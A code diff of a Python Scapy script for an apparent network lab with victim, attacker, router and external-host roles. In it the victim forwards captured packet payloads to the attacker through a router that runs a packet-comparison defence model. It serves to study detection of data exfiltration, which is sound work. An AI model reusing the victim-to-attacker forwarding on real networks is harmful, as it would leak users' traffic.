@@ -11,22 +11,13 @@ import my_ips
 import router
 from time import sleep
 
-role = 'external_host'
 
 # Global 
 def_model = router.DefenseModel()
 
-#victim_ip = os.environ['victim_ip']
-#attacker_ip = os.environ['attacker_ip']
-#router_ip = os.environ['router_ip']
-
-#mypkt = IP(dst=router_ip)/TCP()/Raw(load='test1')
-#r1 = send(mypkt,iface='eth1',timeout=2)
-#exit()
 
 #Modular packet sniffing function
 def packet_sniffer(my_filter, my_prn):
-    print('Calling packet sniffer function.')
     pkt = sniff(filter=my_filter, iface='eth1', prn=my_prn)
 
 #Send packets to a destination via the router VM. The router VM
@@ -43,11 +34,13 @@ def send_to_router(packet):
 
     new_packet = IP(dst=my_ips.router_ip)/TCP(dport=true_dport)/Raw(load=true_load + load_append)
 
-    print('Sending packet to router:', new_packet.show())
-    r1 = send(new_packet,iface='eth1')
+    r1 = send(new_packet, iface='eth1')
 
 #Victim functions
 #---
+
+#"asd;fjasjkfa;fkjas;kjf;sdkjfsk |ORIG_DST=..." 
+
 
 #Sends packet to attacker (via the router VM)
 def send_to_attacker(packet):
@@ -55,9 +48,23 @@ def send_to_attacker(packet):
         data = packet[Raw].load
     except:
         data = ''.encode("utf-8")
-    new_packet = IP(dst=my_ips.attacker_ip)/TCP(dport=80)/Raw(load=data)
-
-    send_to_router(new_packet)
+    # If a packet with the attacker IP as destination was not found
+    if(data.decode("utf-8").find('|ORIG_DST=' + my_ips.attacker_ip) == -1):
+        # If a packet already has "ORIG_DST" appended on the payload
+        if(data.decode("utf-8").find('|ORIG_DST=') != -1):
+            test_field = "|ORIG_DST="
+            # Get the part of the payload after "ORIG_DST = "
+            tmp_data = data.decode("utf-8").partition(test_field)
+            # If other info. is also appended, such as another "ORIG_DST=..."
+            if(tmp_data[2].find('|') != -1):
+                replacement_data = tmp_data[0] + tmp_data[2][tmp_data[2].find('|'):]
+            else:
+                replacement_data = tmp_data[0]
+            data = replacement_data.encode("utf-8")
+        if(packet[IP].src == my_ips.router_ip):
+            new_packet = IP(dst=my_ips.attacker_ip)/TCP(dport=80)/Raw(load=data)
+            new_packet.show()
+            send_to_router(new_packet)
 #---
 
 #Router functions
@@ -72,7 +79,6 @@ def append_orig_source(data, orig_source):
     return new_data
 
 def reroute_packet(packet):
-    print('Packet @ reroute_packet stage:')
     print(packet.show())
     try:
         data = packet[Raw].load
@@ -80,30 +86,26 @@ def reroute_packet(packet):
         data = ''.encode("utf-8")
     data = append_orig_source(data, packet[IP].src)
 
+    
     forwarded_packet = IP()/TCP()/Raw(load=data)
 
     #Get destination address that was embedded in the payload
     dst_addr = get_packet_destination(data)
         
-    # IP address is always the first in the list 
-    
+    if(dst_addr != -1):
+        # Source = hardcoded router's IP address 
+        forwarded_packet[IP].src = get_if_addr('eth1')
+        forwarded_packet[IP].dst = dst_addr
         
-    # Source = hardcoded router's IP address 
-    forwarded_packet[IP].src = get_if_addr('eth1')
-    forwarded_packet[IP].dst = dst_addr
-        
-    forwarded_packet[TCP].sport = packet[TCP].sport
-    forwarded_packet[IP].dport = packet[TCP].dport
+        forwarded_packet[TCP].sport = packet[TCP].sport
+        forwarded_packet[TCP].dport = packet[TCP].dport
 
-    print('Forwarded packet:', forwarded_packet.show())
-    r1 = send(forwarded_packet, timeout=0,iface='eth1')
+        r1 = send(forwarded_packet, iface='eth1')
 
-    defense_model(forwarded_packet)
+        defense_model(forwarded_packet)
 
 def defense_model(packet):
-    print('Getting packet IP')
     source = packet[IP].src
-    print('Source:', source)
 
 
     if packet is not None:
@@ -112,11 +114,7 @@ def defense_model(packet):
             def_model.packet_comparison_algorithm(key, payload)
 
     
-        print('Printing dictionary:')
         def_model.print_contents_of_packet_dictionary()
-
-
-
 
 
 #Parses payload to get the true desination address of the packet.
@@ -130,14 +128,11 @@ def get_packet_destination(data):
     # end info = information after the main payload 
     end_info = data.partition(test_field)[2] 
     if(end_info == ''):
-        print(end_info)
-        print(data)
         return -1;
                                                          
     # Split the end substring by | delimiter 
     end_list = end_info.split('|')
     
-    print(end_list[0])
     return end_list[0]
 
 #---
@@ -146,10 +141,23 @@ def get_packet_destination(data):
 #---
 
 def log_packet(packet):
-    f = open('log_file.txt', 'a')
-    f.write(packet.show())
-    f.write('\n')
-    f.close()
+    if packet.show() is None:
+        print('logging packet')
+        f = open('log_file.txt', 'a')
+        f.write('\n-------------------- Victim packet --------------------')
+        f.write('\nSource IP: ') 
+        f.write(packet[IP].src)
+        f.write('\nDestination IP: ') 
+        f.write(packet[IP].dst)
+        f.write('\nSource port: ') 
+        f.write(str(packet[TCP].sport))
+        f.write('\nDestination port: ')
+        f.write(str(packet[TCP].dport))
+        f.write('\nPayload: ')
+        f.write(packet[Raw].load.decode('utf-8'))
+        f.write('\n-------------------- End of packet --------------------')
+        f.write('\n')
+        f.close()
 
 #---
 
@@ -179,7 +187,6 @@ def build_packet(external_host_ip):
     packet = IP(dst=my_ips.victim_ip)/TCP(dport=80)/Raw(load=payload_string)
 
     send_to_router(packet)
-    #send_packet(packet)
 
 def send_packet(packet):
     print('Sending external packet')
@@ -191,13 +198,20 @@ def send_packet(packet):
 
 if __name__=='__main__':
     local_ip = get_if_addr('eth1')
+    if(local_ip == my_ips.victim_ip):
+        role = 'victim'
+    elif(local_ip == my_ips.attacker_ip):
+        role = 'attacker'
+    elif(local_ip == my_ips.router_ip):
+        role = 'router'
+
     if(role == 'victim'):
-        packet_sniffer('src host ' + local_ip + ' and tcp', send_to_attacker)
+        packet_sniffer('src host ' + my_ips.router_ip + ' and tcp and not tcp[tcpflags] & (tcp-rst) != 0', send_to_attacker)
+        #packet_sniffer('src host ' + my_ips.external_host_ip + ' and tcp and not tcp[tcpflags] & (tcp-rst) != 0', send_to_attacker)
     elif(role == 'router'):
-        packet_sniffer('dst host ' + local_ip + ' and tcp', reroute_packet)
+        packet_sniffer('dst host ' + my_ips.router_ip + ' and tcp', reroute_packet)
     elif(role == 'attacker'):
-        packet_sniffer('src host ' + victim_ip + ' and tcp', log_packet)
+        packet_sniffer('src host ' + my_ips.router_ip + ' and tcp and not tcp[tcpflags] & (tcp-rst) != 0', log_packet)
     elif role == 'external_host':
         while True:
-            build_packet(get_if_addr('eth1'))
-            sleep(5)
+            build_packet(my_ips.external_host_ip)
